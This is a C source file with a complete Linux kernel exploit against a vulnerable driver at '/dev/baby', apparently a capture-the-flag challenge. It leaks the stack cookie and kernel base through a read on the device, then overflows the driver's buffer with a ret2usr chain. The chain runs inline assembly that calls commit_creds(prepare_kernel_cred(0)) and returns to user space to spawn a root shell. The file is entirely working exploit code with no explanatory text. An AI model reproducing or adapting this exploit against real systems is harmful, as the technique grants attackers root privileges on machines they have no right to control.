#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/capability.h>
#include <linux/types.h>
#include <signal.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)
#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

void get_shell()
{
    if (getuid())
    {
        errExit("NO ROOT");
    }
    logOK("Rooted!");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve(argv[0], argv, envp);
}

u64 kern_base = 0;
u64 global_fd;
u64 cookie, pad[2];
u64 prepare_kernel_cred = 0x861d0;
u64 commit_creds = 0x85fa0;

void shellcode()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov rbp, rsp;"
        "xor r14, r14;"
        "xor r13, r13;"
        "xor r12, r12;"
        "xor r11, r11;"
        "xor r9, r9;"
        "xor r8, r8;"
        "xor rbx, rbx;"
        "mov rdi, 0;"
        "mov rax, prepare_kernel_cred;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, commit_creds;"
        "call rax;"
        "swapgs;"
        "iretq;"
        ".att_syntax;"
        );
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
        );
    user_ip = (u64)get_shell;
    logInfo("Saved user state");
}

void leak()
{
    u64 * buf = malloc(0x210);
    read(global_fd, buf, 0x210);
    for(int i = 0; i < 0x210 / 8; i++)
        printf("[%d]: %llx\n", i, buf[i]);
    cookie = buf[50];
    kern_base = buf[51] - 0x1ca727;
    pad[0] = buf[52];
    pad[1] = buf[53];
    prepare_kernel_cred += kern_base;
    commit_creds += kern_base;
    logInfo("Cookie: %llx", cookie);
    logInfo("Kernel base: %llx", kern_base);
    logInfo("prepare_kernel_cred: %llx", prepare_kernel_cred);
    logInfo("commit_creds: %llx", commit_creds);
    free(buf);
}


void exploit()
{
    u64 * buf = malloc(0x500);
    u64 idx = 0;
    for(int i = 0; i < 50; i++)
        buf[idx++] = 0;
    buf[idx++] = cookie;
    buf[idx++] = shellcode + 8;
    buf[idx++] = user_ip;
    buf[idx++] = user_cs;
    buf[idx++] = user_rflags;
    buf[idx++] = user_sp;
    buf[idx++] = user_ss;
    write(global_fd, buf, sizeof(u64) * idx);
    free(buf);
}


int main(int argc, char **argv, char **envp)
{
    global_fd = open("/dev/baby", 2);
    if(global_fd < 1)
    {
        logErr("Device open failed");
        exit(0);
    }
    else
        logOK("Device opened");
    
    leak();
	signal(SIGSEGV, get_shell);
    save_state();
    exploit();
}